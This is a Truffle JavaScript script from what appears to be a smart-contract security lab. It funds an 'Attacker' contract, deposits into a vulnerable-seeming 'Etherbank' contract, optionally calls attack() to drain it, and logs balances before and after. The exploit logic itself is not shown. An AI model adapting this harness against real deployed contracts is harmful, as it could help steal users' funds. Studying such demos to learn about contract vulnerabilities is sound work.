require("dotenv").config();

const {CONTRACT_ADDRESS_ATTACKER, CONTRACT_ADDRESS_ETHER_BANK} = process.env;

// Loading the compiled contract Json
const attackerJson = require("../build/contracts/Attacker.json");
const etherbankJson = require("../build/contracts/Etherbank.json");
const etherbankUpdatedJson = require("../build/contracts/EtherbankUpdated.json");

module.exports = async function (callback) {
    const attack = false;

    // web3 is injected by Truffle
    const contractAttacker = new web3.eth.Contract(
        attackerJson.abi,
        CONTRACT_ADDRESS_ATTACKER
    );

    const contractEtherbank = new web3.eth.Contract(
        etherbankJson.abi,
        CONTRACT_ADDRESS_ETHER_BANK
    );

    const deposit1 = contractAttacker.methods.depositToAttacker();

    await deposit1.send({
        from: (await web3.eth.getAccounts())[1],
        value: web3.utils.toWei('10', 'ether'),
    }).then(function (receipt) {
        console.log(receipt.transactionHash);
    });

    const attackerBalance = await web3.eth.getBalance(contractAttacker.options.address);
    console.log("Attacker Contract Balance: " + web3.utils.fromWei(attackerBalance, 'ether') + " ETH");

    const etherbankBalance = await web3.eth.getBalance(contractEtherbank.options.address);
    console.log("Etherbank Contract Balance: " + web3.utils.fromWei(etherbankBalance, 'ether') + " ETH");

    const balance1 = contractAttacker.methods.depositFromAttackerToBank();
    const balance1Receipt = await balance1.send({
        from: (await web3.eth.getAccounts())[0]
    });

    const contractEtherbankBalance = await web3.eth.getBalance(contractEtherbank.options.address);
    console.log("Contract Etherbank Balance: " + web3.utils.fromWei(contractEtherbankBalance, 'ether') + " ETH");

    if (attack) {

        console.log("Performing Attack");
        const attackTx = contractAttacker.methods.attack();
        await attackTx.send({
            from: (await web3.eth.getAccounts())[0]
        }).then(function (receipt) {
            console.log("Attack Complete - " + receipt.transactionHash);
            console.log();
        });
    }

    const attackerBalanceAfter = await web3.eth.getBalance(contractAttacker.options.address);
    console.log("Attacker Contract Balance After Attack: " + web3.utils.fromWei(attackerBalanceAfter, 'ether') + " ETH");

    const etherbankBalanceAfter = await web3.eth.getBalance(contractEtherbank.options.address);
    console.log("Etherbank Contract Balance After Attack: " + web3.utils.fromWei(etherbankBalanceAfter, 'ether') + " ETH");

    callback();
};
